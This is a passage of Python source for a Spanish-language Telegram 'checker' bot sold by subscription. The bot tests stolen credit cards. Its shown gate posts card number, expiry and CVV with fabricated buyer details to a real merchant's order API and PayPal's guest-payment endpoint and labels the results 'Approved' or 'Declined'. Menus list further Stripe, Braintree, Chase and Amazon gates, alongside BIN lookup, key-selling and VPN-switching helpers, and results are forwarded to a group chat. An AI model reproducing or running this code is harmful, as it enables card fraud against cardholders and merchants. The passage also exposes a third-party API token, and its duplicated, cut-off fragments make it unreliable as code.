name="email"\r\n\r\nnonokan176@iucake.com\r\n------WebKitFormBoundaryhxWqDBU9FLVxHIeR\r\nContent-Disposition: form-data; name="orderNum"\r\n\r\n1696793445\r\n------WebKitFormBoundaryhxWqDBU9FLVxHIeR\r\nContent-Disposition: form-data; name="totalPrice"\r\n\r\n124.50\r\n------WebKitFormBoundaryhxWqDBU9FLVxHIeR\r\nContent-Disposition: form-data; name="shippingCost"\r\n\r\n7.50\r\n------WebKitFormBoundaryhxWqDBU9FLVxHIeR\r\nContent-Disposition: form-data; name="salesTax"\r\n\r\n0.00\r\n------WebKitFormBoundaryhxWqDBU9FLVxHIeR\r\nContent-Disposition: form-data; name="subtotal"\r\n\r\n117.00\r\n------WebKitFormBoundaryhxWqDBU9FLVxHIeR\r\nContent-Disposition: form-data; name="discount"\r\n\r\n0.00\r\n------WebKitFormBoundaryhxWqDBU9FLVxHIeR\r\nContent-Disposition: form-data; name="cart"\r\n\r\na:1:{i:0;a:6:{s:5:"photo";s:26:"Five-Legged Jumping Spider";s:8:"filename";s:8:"029A7015";s:8:"material";s:12:"AcrylicPrint";s:4:"size";s:3:"8x8";s:6:"option";s:3:"N/A";s:5:"price";s:6:"117.00";}}\r\n------WebKitFormBoundaryhxWqDBU9FLVxHIeR--\r\n'
        idtoken = session.post('https://lschroederphoto.com/shop/api/createOrder.php', headers=headers, data=data)
        if 'true' in idtoken.text:id = idtoken.json()['data']['id']
        else: return 'Declined! [x]','CARD_GENERIC_ERROR'
        

        headers = {'authority': 'www.paypal.com','accept': '*/*','accept-language': 'es-EC,es-419;q=0.9,es;q=0.8','content-type': 'application/json','origin': 'https://www.paypal.com','paypal-client-context': f'{id}','paypal-client-metadata-id': f'{id}','referer': f'https://www.paypal.com/smart/card-fields?sessionID=uid_9e32583254_mtk6mjc6mjk&buttonSessionID=uid_3a7cb51d39_mtk6mza6mzy&locale.x=es_EC&commit=true&env=production&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVhKU1g1SlVVY2Z5Y045T0Q3RU9HZlRhdEU0Z1VrYnZ2VUpSYWhSXzlUX1pCbkxfR1d3SUlLX3RBSy1wY2QyOW5GaG5ZVXZCbV9CQk1RMzAiLCJhdHRycyI6eyJkYXRhLXVpZCI6InVpZF9nY3Viem91eHR3b2xyeWdpc2V3eXdmcnFjY3lwenMifX0&disable-card=&token={id}','sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36','x-app-name': 'standardcardfields','x-country': 'US',}
        json_data = {'query': '\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput!\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ','variables': {'token': f'{id}','card': {'cardNumber': f'{cc}','expirationDate': f'{mes}/{ano}','postalCode': '10080','securityCode': f'{cvv}',},'phoneNumber': '8123672065','firstName': 'DANIEL','lastName': 'MEDINA','billingAddress': {'givenName': 'DANIEL','familyName': 'MEDINA','line1': 'Ms Diana Hayes','line2': '','city': 'new york','state': 'NY','postalCode': '10080','country': 'US',},'email': f'{nombre}@iucake.com','currencyConversionType': 'PAYPAL',},'operationName': None,}
        response = session.post('https://www.paypal.com/graphql?fetch_credit_form_submit',headers=headers,json=json_data,)
        
        
        if 'RISK_DISALLOWED' in response.text: return 'Approved! ✅',response.json()['errors'][0]['data'][0]['code']
        elif 'EXISTING_ACCOUNT_RESTRICTED' in response.text: return 'Approved! ✅',response.json()['errors'][0]['data'][0]['code']
        elif 'VALIDATION_ERROR'  in response.text: return 'Approved! ✅',response.json()['errors'][0]['data'][0]['code']
        else: return 'Declined! ❌',response.json()['errors'][0]['data'][0]['code']


    except: return 'Declined! ❌','CARD_GENERIC_ERROR'       

from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import aiohttp

async def bin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("⚠️ Debes proporcionar un BIN.\nEjemplo: /bin 45717360")
        return

    bin_number = context.args[0]
    if not bin_number.isdigit() or len(bin_number) < 6:
        await update.message.reply_text("❌ El BIN debe tener al menos 6 dígitos numéricos.")
        return

    url = f"https://bins.antipublic.cc/bins/{bin_number}"

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as response:
                if response.status != 200:
                    await update.message.reply_text("❌ BIN no encontrado o error en la API.")
                    return
                data = await response.json()

        respuesta = (
            f"💳 BIN: {bin_number}\n"
            f"🏷 Marca: {data.get('vendor', 'Desconocido')}\n"
            f"📶 Tipo: {data.get('type', 'Desconocido')}\n"
            f"🏦 Banco: {data.get('bank', 'Desconocido')}\n"
            f"🌍 País: {data.get('country', 'Desconocido')}\n"
        )
        await update.message.reply_text(respuesta)

    except Exception as e:
        await update.message.reply_text(f"⚠️ Error al consultar BIN: {e}")

        
   
    



# ID del grupo al que quieres enviar los mensajes
GRUPO_CHAT_ID = 846983753



import subprocess
import telegram
from telegram.ext import Updater, CommandHandler
async def conectar(update, context):
    try:
        chat_id = update.message.chat_id  # Obtener el chat ID del mensaje recibido
        # Asegúrate de poner la ruta correcta a tu archivo .ovpn
        command = "sudo openvpn --config /etc/openvpn/mx-qro.prod.surfshark.com_udp.ovpn &"
        subprocess.run(command, shell=True)
        await context.bot.send_message(chat_id=chat_id, text="Conectando a OpenVPN...")
        
        # Verifica si la conexión se estableció
        check_command = "pgrep openvpn"
        process = subprocess.run(check_command, shell=True, stdout=subprocess.PIPE)
        
        if process.returncode == 0:
            await context.bot.send_message(chat_id=chat_id, text="OpenVPN se ha conectado con éxito.")
        else:
            await context.bot.send_message(chat_id=chat_id, text="No se pudo conectar a OpenVPN.")
    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"Error al conectar: {str(e)}")

# Función para desconectar OpenVPN
async def desconectar(update, context):
    try:
        chat_id = update.message.chat_id  # Obtener el chat ID del mensaje recibido
        # Comando para desconectar OpenVPN
        command = "sudo pkill openvpn"
        subprocess.run(command, shell=True)
        await context.bot.send_message(chat_id=chat_id, text="Desconectando de OpenVPN...")
        
        # Verifica si OpenVPN está desconectado
        check_command = "pgrep openvpn"
        process = subprocess.run(check_command, shell=True, stdout=subprocess.PIPE)
        
        if process.returncode != 0:
            await context.bot.send_message(chat_id=chat_id, text="OpenVPN se ha desconectado.")
        else:
            await context.bot.send_message(chat_id=chat_id, text="No se pudo desconectar de OpenVPN.")
    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"Error al desconectar: {str(e)}")

# Función para reconectar OpenVPN
async def reconectar(update, context):
    try:
        chat_id = update.message.chat_id  # Obtener el chat ID del mensaje recibido
        # Desconectar primero
        await desconectar(update, context)
        
        # Espera un poco antes de intentar reconectar
        await context.bot.send_message(chat_id=chat_id, text="Reconectando a OpenVPN...")
        
        # Conectar de nuevo
        await conectar(update, context)
    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"Error al reconectar: {str(e)}")




import re
import datetime
from telegram import Update
from telegram.ext import CallbackContext
from datetime import datetime
async def extraer_tarjetas(update: Update, context: CallbackContext):
    """Extrae todas las tarjetas en formato CC|MES|AÑO|CVV y elimina las vencidas, permitiendo las del mes actual."""

    if not context.args:
        await update.message.reply_text("⚠️ Debes proporcionar un texto con las tarjetas. Ejemplo:\n`/cc 4169161432096914|12|2028|199`", parse_mode="Markdown")
        return

    # Obtener el mensaje enviado después de /cc
    texto = " ".join(context.args)

    # Expresión regular para detectar tarjetas en formato XXXX|XX|XXXX|XXX
    patron = re.compile(r"(\d{13,16})\|(\d{2})\|(\d{4})\|(\d{3,4})")

    # Obtener la fecha actual
    ahora = datetime.now()
    mes_actual = int(ahora.strftime("%m"))
    anio_actual = int(ahora.strftime("%Y"))

    # Filtrar solo las tarjetas que NO están vencidas o que son del mes/año actual
    tarjetas_validas = []

    for cc, mes, ano, cvv in patron.findall(texto):
        mes = int(mes)
        ano = int(ano)

        # Verifica si la tarjeta sigue vigente o es del mes/año actual
        if (ano > anio_actual) or (ano == anio_actual and mes >= mes_actual):
            tarjetas_validas.append(f"{cc}|{mes:02d}|{ano}|{cvv}")  # Asegura que el mes tenga 2 dígitos

    # Responder con las tarjetas válidas
    if tarjetas_validas:
        resultado = "\n".join(tarjetas_validas)
        await update.message.reply_text(f"✅ Tarjetas válidas:\n\n{resultado}")
    else:
        await update.message.reply_text("⚠️ No se encontraron tarjetas vigentes en el mensaje.")
# Procesar tarjetas en un hilo separado
IDMASS_FILE = "idmass.txt"

def verificar_id_mass(chat_id):
    """Verifica si el usuario está autorizado para Mass Mode"""
    try:
        with open(IDMASS_FILE, "r") as f:
            ids_autorizados = {line.strip() for line in f}  # Usamos un set para búsqueda rápida
        return str(chat_id) in ids_autorizados
    except FileNotFoundError:
        return False  # Si el archivo no existe, nadie está autorizado


async def procesar_tarjetas(cc_numbers, chat_id, funcion_async, message_id):
    tasks = []
    
    for cc in cc_numbers:
        datos = cc.split("|")
        if len(datos) == 4:  # Validamos que sean 4 partes antes de ejecutar
            tasks.append(funcion_async(datos, chat_id))
        else:
            print(f"❌ Formato incorrecto: {cc}")  # Debugging

    if tasks:
        resultados = await asyncio.gather(*tasks)

        mensaje = "\n".join(resultados)
        
        # Actualizar el mensaje original en lugar de enviar uno nuevo
        requests.get(f"https://api.telegram.org/bot{TOKEN_ID}/editMessageText", params={
            "chat_id": chat_id,
            "message_id": message_id,
            "parse_mode": "Markdown",
            "text": mensaje
        })
        GRUPO_CHAT_ID = -4669383983  # Reemplaza con el ID real del grupo
        requests.get(TELEGRAM_API_URL, params={"chat_id": GRUPO_CHAT_ID, "parse_mode": "Markdown", "text": mensaje})


# Procesar tarjetas en un hilo separado
def process_cards_in_thread(cards, chat_id, funcion_async, message_id):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(procesar_tarjetas(cards, chat_id, funcion_async, message_id))
    loop.close()


# Manejo de comandos dinámicamente
from telegram.ext import Application, CommandHandler
def verificar_id_mass(chat_id):
    try:
        with open('idmass.txt', 'r') as file:
            ids_mass = file.read().splitlines()
        return str(chat_id) in ids_mass
    except FileNotFoundError:
        return False

def agregar_id_autorizado(chat_id_str):
    try:
        if verificar_id_autorizado(chat_id_str):
            return "existe"
        with open('ids.txt', 'a') as file:
            file.write(f"{chat_id_str}\n")
        return True
    except Exception as e:
        print(f"Error al agregar ID: {e}")
        return False

async def adid(update: Update, context: CallbackContext):
    chat_id = update.message.chat_id

    if not verificar_id_mass(chat_id):
        await update.message.reply_text("🚫 No estás autorizado para usar este comando.")
        return

    args = context.args
    
    if not args or len(args) != 1:
        await update.message.reply_text("⚠️ Debes proporcionar un ID válido para agregar.")
        return

    nuevo_id = args[0].strip()
    if not nuevo_id.lstrip('-').isdigit():
        await update.message.reply_text("❌ El ID proporcionado no es válido. Asegúrate de que sea un número o incluya el signo '-' para grupos.")
        return

    resultado = agregar_id_autorizado(nuevo_id)
    
    if resultado == "existe":
        await update.message.reply_text(f"✅ El ID `{nuevo_id}` ya existe en la lista de autorizados.", parse_mode="Markdown")
    elif resultado:
        await update.message.reply_text(f"✅ ID `{nuevo_id}` agregado exitosamente.", parse_mode="Markdown")
    else:
        await update.message.reply_text(f"❌ Error al agregar el ID `{nuevo_id}`.", parse_mode="Markdown")


def verificar_id_autorizado(chat_id):
    try:
        with open('ids.txt', 'r') as file:
            ids_autorizados = file.read().splitlines()
        return str(chat_id) in ids_autorizados
    except FileNotFoundError:
        return False

async def mostrar_id(update: Update, context: CallbackContext):
    chat = update.message.chat
    user = update.message.from_user
    
    if chat.type == "private":
        await update.message.reply_text(f"🆔 Tu ID es: `{user.id}`", parse_mode="Markdown")
    else:
        await update.message.reply_text(f"🆔 Tu ID: `{user.id}`\n🆔 ID del Grupo: `{chat.id}`", parse_mode="Markdown")

import asyncio
from telegram import Update, InputFile, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import ContextTypes

# 🧵 Esta función se ejecutará en un hilo
def construir_datos_respuesta():
    gif_path = "kury.gif"
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🛠 Gates", callback_data="gates")],
        [InlineKeyboardButton("ℹ️ Info", callback_data="info")],
        [InlineKeyboardButton("🛒 Sellers", callback_data="sellers")],
        [InlineKeyboardButton("🧰 Tools", callback_data="tools")]
    ])
    return gif_path, keyboard

# 🔁 Esta es la función principal que se registra con el comando
async def mostrar_comandos(update: Update, context: ContextTypes.DEFAULT_TYPE):
    gif_path, keyboard = await asyncio.to_thread(construir_datos_respuesta)

    with open(gif_path, "rb") as gif:
        await context.bot.send_animation(
            chat_id=update.effective_chat.id,
            animation=InputFile(gif),
            caption="👋 <b>Bienvenido al panel de comandos</b>\nSelecciona una opción:",
            parse_mode="HTML",
            reply_markup=keyboard
        )

async def manejar_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    # Volver al menú principal
    if data == "volver_menu":
        gif_path, keyboard = await asyncio.to_thread(construir_datos_respuesta)
        with open(gif_path, "rb") as gif:
            await context.bot.send_animation(
                chat_id=query.message.chat_id,
                animation=InputFile(gif),
                caption="👋 <b>Bienvenido de nuevo al menú principal</b>\nSelecciona una opción:",
                parse_mode="HTML",
                reply_markup=keyboard
            )
        await query.delete_message()  # Opcional: eliminar el mensaje anterior
        return

    if data == "gates":
        sub_keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("⚡ Charge", callback_data="gates_charge")],
            [InlineKeyboardButton("✅ Auth", callback_data="gates_auth")],
            [InlineKeyboardButton("💳 CCN", callback_data="gates_ccn")],
            [InlineKeyboardButton("📦 Mass", callback_data="gates_mass")],
            [InlineKeyboardButton("🔙 Volver al menú", callback_data="volver_menu")]
        ])
        await query.edit_message_caption(
            caption="🔐 <b>Selecciona un tipo de Gate:</b>",
            parse_mode="HTML",
            reply_markup=sub_keyboard
        )

    elif data == "gates_charge":
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 Volver al menú", callback_data="volver_menu")]
        ])
        await query.edit_message_caption(
            caption=(
                "💻 <b>Comando:</b> /an\n"
                "🌐 <b>Pasarela:</b> Stripe Woo\n"
                "💰 <b>Cobro:</b> $80 MX\n"
                "__________________________________\n"
                "💻 <b>Comando:</b> /ccs\n"
                "🌐 <b>Pasarela:</b> Stripe \n"
                "💰 <b>Cobro:</b> $150 MX\n"
                "__________________________________\n"
                "💻 <b>Comando:</b> /c\n"
                "🌐 <b>Pasarela:</b> Stripe Woo\n"
                "💰 <b>Cobro:</b> $100 MX\n"
                "__________________________________\n"
                "💻 <b>Comando:</b> /ts\n"
                "🌐 <b>Pasarela:</b> Multi Pasarela\n"
                "💰 <b>Cobro:</b> $1 MX\n"
                "__________________________________\n"
                "💻 <b>Comando:</b> /em\n"
                "🌐 <b>Pasarela:</b> Multi Pasarela\n"
                "💰 <b>Cobro:</b> $1 MX\n"
                "__________________________________\n"
                "💻 <b>Comando:</b> /cs\n"
                "🌐 <b>Pasarela:</b> Payflow Chase\n"
                "💰 <b>Cobro:</b> $98 MX\n"
                "__________________________________\n"
		        "💻 <b>Comando:</b> /tec\n"
                "🌐 <b>Pasarela:</b> Multi \n"
                "💰 <b>Cobro:</b> $1 MX\n"
                "__________________________________\n"
                "💻 <b>Comando:</b> /red\n"
                "🌐 <b>Pasarela:</b> Multi \n"
                "💰 <b>Cobro:</b> $115 MX\n"
                "__________________________________\n"
                "💻 <b>Comando:</b> /ul\n"
                "🌐 <b>Pasarela:</b> Multi \n"
                "💰 <b>Cobro:</b> $120 MX\n"
                "__________________________________\n"

            ),
            parse_mode="HTML",
            reply_markup=keyboard
        )

    elif data == "gates_auth":
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 Volver al menú", callback_data="volver_menu")]
        ])
        await query.edit_message_caption(
            caption=(
                "💻 <b>Comando:</b> /th\n"
                "🌐 <b>Pasarela:</b> Stripe Auth\n"
                "💰 <b>Cobro:</b> $0\n"
                "__________________________________\n"
                "💻 <b>Comando:</b> /c3\n"
                "🌐 <b>Pasarela:</b> Braintree Auth\n"
                "💰 <b>Cobro:</b> $0\n"
                "__________________________________\n"
            ),
            parse_mode="HTML",
            reply_markup=keyboard
        )
    elif data == "gates_mass":
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 Volver al menú", callback_data="volver_menu")]
        ])
        await query.edit_message_caption(
            caption=(
                "💻 <b>Comando:</b> /amz\n"
                "🌐 <b>Pasarela:</b> Gate Amazon Multi Pais\n"
                "💰 <b>Cobro:</b> $0\n"
                
            ),
            parse_mode="HTML",
            reply_markup=keyboard
        )
    elif data.startswith("gates_"):
        tipo = data.split("_")[1].upper()
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 Volver al menú", callback_data="volver_menu")]
        ])
        await query.edit_message_caption(
            caption=f"✳️ <b>Estos son los gates disponibles para {tipo}</b>",
            parse_mode="HTML",
            reply_markup=keyboard
        )

    else:
        respuestas = {
            "info": "ℹ️ Información del bot...",
            "sellers": "🛍 Estos son los sellers verificados...\n @kaosfix Seller \n @MDMOFIC  Seller ",
            "tools": "🧰 Kuriyama Tools...\n__________________________________\n💻 <b>Comando:</b> /cookie\n🌐 <b>Funcion:</b> Comando Para Guardar Cookie\n__________________________________\n💻 <b>Comando:</b> /direccion\n🌐 <b>Funcion:</b> Direccion Para Amazon\n__________________________________\n💻 <b>Comando:</b> /datos\n🌐 <b>Funcion:</b> Direccion Random Mx\n__________________________________\n💻 <b>Comando:</b> /cc\n🌐 <b>Funcion:</b> Limpia el Formato de las ccs\n"
        }

        respuesta = respuestas.get(data, "❓ Opción no válida.")
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 Volver al menú", callback_data="volver_menu")]
        ])
        await query.edit_message_caption(caption=respuesta, parse_mode="HTML", reply_markup=keyboard)

from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, CallbackContext
import uuid
import json
import os
import random
import string
from datetime import datetime, timedelta

# ----------- Configuración -----------
KEYS_FILE = "keys.json"
CLAIMED_FILE = "claimed_keys.json"
SELLERS_FILE = "sellers.json"
ADMIN_ID = "846983753"  # ID del administrador

# ----------- Funciones de apoyo -----------

def load_json(filename):
    if not os.path.exists(filename) or os.path.getsize(filename) == 0:
        with open(filename, "w") as f:
            if filename == SELLERS_FILE:
                json.dump({}, f)
                return {}
            else:
                json.dump({}, f)
                return {}
    with open(filename, "r") as f:
        try:
            return json.load(f)
        except json.JSONDecodeError:
            with open(filename, "w") as f_fix:
                json.dump({}, f_fix)
                return {}

def save_json(filename, data):
    with open(filename, "w") as f:
        json.dump(data, f, indent=4)

def is_seller_o_admin(user_id: str) -> bool:
    if user_id == ADMIN_ID:
        return True
    sellers = load_json(SELLERS_FILE)
    return user_id in sellers

def generate_key(length=16) -> str:
    chars = string.ascii_uppercase + string.digits
    return ''.join(random.choices(chars, k=length))

# ----------- Comandos -----------

async def key_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)

    if not is_seller_o_admin(user_id):
        await update.message.reply_text("⛔ No tienes permiso para generar keys.")
        return

    if len(context.args) != 2:
        await update.message.reply_text("Uso correcto: /key <cantidad> <duración> (1d, 7d, 15d, 30d)")
        return

    try:
        cantidad = int(context.args[0])
        duracion = context.args[1]
    except ValueError:
        await update.message.reply_text("⚠️ La cantidad debe ser un número entero.")
        return

    dur_map = {"1d": 1, "7d": 7, "15d": 15, "30d": 30}
    if duracion not in dur_map:
        await update.message.reply_text("⏱️ Duración inválida. Usa: 1d, 7d, 15d o 30d.")
        return

    dias = dur_map[duracion]
    keys = load_json(KEYS_FILE)
    generadas = []

    for _ in range(cantidad):
        key = generate_key()
        keys[key] = {
            "duration_days": dias
        }
        generadas.append(key)

    save_json(KEYS_FILE, keys)

    texto = "\n".join(generadas)
    await update.message.reply_text(
        f"🔑 *Claves generadas* ({dias} días):\n\n`{texto}`",
        parse_mode="Markdown"
    )

async def claim_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)

    if len(context.args) != 1:
        await update.message.reply_text("Uso correcto: /claim <key>")
        return

    key_input = context.args[0]
    now = datetime.utcnow()
    keys = load_json(KEYS_FILE)
    claimed = load_json(CLAIMED_FILE)

    if key_input not in keys:
        await update.message.reply_text("❌ Clave inválida o ya usada.")
        return

    dias = keys[key_input]["duration_days"]

    if user_id in claimed:
        exp = datetime.fromisoformat(claimed[user_id]["expires_at"])
        if exp > now:
            new_exp = exp + timedelta(days=dias)
            claimed[user_id]["expires_at"] = new_exp.isoformat()
            msg = f"🕒 Tu tiempo ha sido extendido hasta el {new_exp} UTC."
        else:
            new_exp = now + timedelta(days=dias)
            claimed[user_id] = {"key": key_input, "expires_at": new_exp.isoformat()}
            msg = f"🔄 Tu key fue renovada. Expira el {new_exp} UTC."
    else:
        exp = now + timedelta(days=dias)
        claimed[user_id] = {"key": key_input, "expires_at": exp.isoformat()}
        msg = f"✅ Key reclamada con éxito. Expira el {exp} UTC."

    save_json(CLAIMED_FILE, claimed)
    del keys[key_input]
    save_json(KEYS_FILE, keys)
    await update.message.reply_text(msg)

async def add_seller_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)

    if user_id != ADMIN_ID:
        await update.message.reply_text("⛔ Solo el administrador puede usar este comando.")
        return

    if len(context.args) != 1:
        await update.message.reply_text("Uso correcto: /addseller <id>")
        return

    new_seller_id = context.args[0]
    sellers = load_json(SELLERS_FILE)

    if new_seller_id in sellers:
        await update.message.reply_text("⚠️ Ese seller ya está registrado.")
    else:
        sellers[new_seller_id] = True
        save_json(SELLERS_FILE, sellers)
        await update.message.reply_text(f"✅ Seller {new_seller_id} agregado exitosamente.")

import json
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

SELLERS_FILE = "sellers.json"
CLAIMED_FILE = "claimed.json"

def load_json(file_path):
    try:
        with open(file_path, "r", encoding="utf-8") as f:
            return json.load(f)
    except FileNotFoundError:
        print(f"[DEBUG] El archivo {file_path} no existe.")
        return {}
    except json.JSONDecodeError:
        print(f"[DEBUG] Error al decodificar JSON en {file_path}.")
        return {}

def save_json(file_path, data):
    with open(file_path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4)

async def bankey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    sellers = load_json(SELLERS_FILE)

    if user_id not in sellers:
        await update.message.reply_text("❌ No tienes permisos para usar este comando.")
        return

    args = context.args
    if not args:
        await update.message.reply_text(
            "❌ Debes enviar la key a eliminar. Ejemplo:\n/bankey ODNITN2TYNO5NS59",
            parse_mode=ParseMode.HTML
        )
        return

    key_a_borrar = args[0].strip()
    claimed = load_json(CLAIMED_FILE)

    # Buscar la key en el dict (buscar user_id que tenga esa key)
    user_id_encontrado = None
    for user_id_reclamo, data in claimed.items():
        if data.get("key") == key_a_borrar:
            user_id_encontrado = user_id_reclamo
            break

    if user_id_encontrado is None:
        await update.message.reply_text(
            f"❌ No se encontró la key <code>{key_a_borrar}</code> en el sistema.",
            parse_mode=ParseMode.HTML
        )
        return

    # Eliminar la key del usuario encontrado
    del claimed[user_id_encontrado]
    save_json(CLAIMED_FILE, claimed)

    # Enviar mensaje al usuario cuya key fue revocada
    try:
        await context.bot.send_message(
            chat_id=int(user_id_encontrado),
            text="⚠️ Se te revocó tu key, gracias por haber sido parte de el mejor check."
        )
    except Exception as e:
        print(f"[ERROR] No se pudo notificar al usuario {user_id_encontrado}: {e}")

    # Confirmar al que pidió el ban
    await update.message.reply_text(
        f"✅ La key <code>{key_a_borrar}</code> ha sido dada de baja y eliminada del sistema.",
        parse_mode=ParseMode.HTML
    )



funciones_playwright = {
   
    "bra": brades,
    
    "br":bra,
    
}
def load_json(filename):
    if not os.path.exists(filename) or os.path.getsize(filename) == 0:
        with open(filename, "w") as f:
            if filename == SELLERS_FILE:
                json.dump([], f)
                return []
            else:
                json.dump({}, f)
                return {}
    with open(filename, "r") as f:
        try:
            return json.load(f)
        except json.JSONDecodeError:
            with open(filename, "w") as f_fix:
                if filename == SELLERS_FILE:
                    json.dump([], f_fix)
                    return []
                else:
                    json.dump({}, f_fix)
                    return {}

# Verifica si el usuario es un seller
def is_seller(user_id):
    sellers = load_json(SELLERS_FILE)
    return str(user_id) in sellers

# Verifica si el usuario tiene una suscripción activa
def has_subscription(user_id):
    claimed = load_json(CLAIMED_FILE)
    if user_id in claimed:
        expiration_date = datetime.fromisoformat(claimed[user_id]["expires_at"])
        return expiration_date > datetime.utcnow()  # Si la fecha de expiración es futura
    return False

# Verifica si el usuario es admin
def is_admin(user_id):
    return str(user_id) == ADMIN_ID

# Verifica si el ID está autorizado para usar el checker
def verificar_id_autorizado(user_id):
    return is_admin(user_id) or is_seller(user_id) or has_subscription(user_id)

# ---------- Procesar tarjetas ----------
async def procesar_tarjetas(cc_numbers, chat_id, funcion_async, message_id):
    tasks = []
    
    for cc in cc_numbers:
        datos = cc.split("|")
        if len(datos) == 4:  # Validamos que sean 4 partes antes de ejecutar
            tasks.append(funcion_async(datos, chat_id))
        else:
            print(f"❌ Formato incorrecto: {cc}")  # Debugging

    if tasks:
        resultados = await asyncio.gather(*tasks)

        mensaje = "\n".join(resultados)
        
        # Actualizar el mensaje original en lugar de enviar uno nuevo
        requests.get(f"https://api.telegram.org/bot{TOKEN_ID}/editMessageText", params={
            "chat_id": chat_id,
            "message_id": message_id,
            "parse_mode": "Markdown",
            "text": mensaje
        })
        
        # Enviar mensaje al grupo
        requests.get(TELEGRAM_API_URL, params={"chat_id": GRUPO_CHAT_ID, "parse_mode": "Markdown", "text": mensaje})

# Procesar tarjetas en un hilo separado
def process_cards_in_thread(cards, chat_id, funcion_async, message_id):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(procesar_tarjetas(cards, chat_id, funcion_async, message_id))
    loop.close()

# ---------- Función principal para ejecutar la verificación y procesar tarjetas ----------
async def ejecutar_verificacion(update: Update, context: CallbackContext):
    comando = update.message.text.split()[0][1:]  # Extrae el comando sin "/"
    chat_id = update.message.chat_id
    tarjetas = context.args

    

    if not tarjetas:
        await update.message.reply_text(
            "⚠️ Debes proporcionar las tarjetas en este formato:\n"
            "`1234567890123456|12|2025|123`",
            parse_mode="Markdown"
        )
        return

    # Si se está utilizando "Mass Mode" y no está autorizado
   
    

    if comando in funciones_playwright:
        funcion_async = funciones_playwright[comando]

        # Enviar mensaje inicial y obtener el ID
        mensaje_inicial = await update.message.reply_text(f"✅ Procesando las tarjetas con el método `{comando}`...")
        message_id = mensaje_inicial.message_id

        # Ejecuta en un hilo separado
        thread = threading.Thread(target=process_cards_in_thread, args=(tarjetas, chat_id, funcion_async, message_id))
        thread.start()

    else:
        await update.message.reply_text(f"❌ El comando `{comando}` no existe 😭\n\n🔹 Usa /help para ver la lista de comandos disponibles.", parse_mode="Markdown")

TOKEN_COPOMEX = "18a40bf4-ad2d-4599-87da-b3b671d1998a"



# Listas de nombres y apellidos reales
nombres = ["Juan", "María", "José", "Guadalupe", "Francisco", "Carlos", "Ana", "Luis", "Sofía", "Pedro"]
apellidos = ["García", "Martínez", "López", "Hernández", "González", "Pérez", "Sánchez", "Ramírez", "Torres", "Flores"]
correos_usados = set()
# Lista de códigos postales de México (esto es solo un ejemplo, puedes añadir más códigos)
codigos_postales_mx = [
    "01000", "01010", "01020", "01030", "01040", "01050", "01060", "01070", "01080", "01090",  # Ciudad de México
    "14000", "14010", "14020", "14030", "14040", "14050", "14060", "14070", "14080", "14090",  # Ciudad de México
    "31000", "31100", "31200", "31300", "31400", "31500", "31600", "31700", "31800", "31900",  # Chihuahua
    "57000", "57100", "57200", "57300", "57400", "57500", "57600", "57700", "57800", "57900",  # Estado de México
    "30000", "30100", "30200", "30300", "30400", "30500", "30600", "30700", "30800", "30900",  # Guerrero
    "98000", "98100", "98200", "98300", "98400", "98500", "98600", "98700", "98800", "98900",  # Jalisco
    "72000", "72100", "72200", "72300", "72400", "72500", "72600", "72700", "72800", "72900",  # Puebla
    "64000", "64100", "64200", "64300", "64400", "64500", "64600", "64700", "64800", "64900",  # Nuevo León
    "45000", "45100", "45200", "45300", "45400", "45500", "45600", "45700", "45800", "45900",  # Jalisco
    "03000", "03100", "03200", "03300", "03400", "03500", "03600", "03700", "03800", "03900",  # Ciudad de México
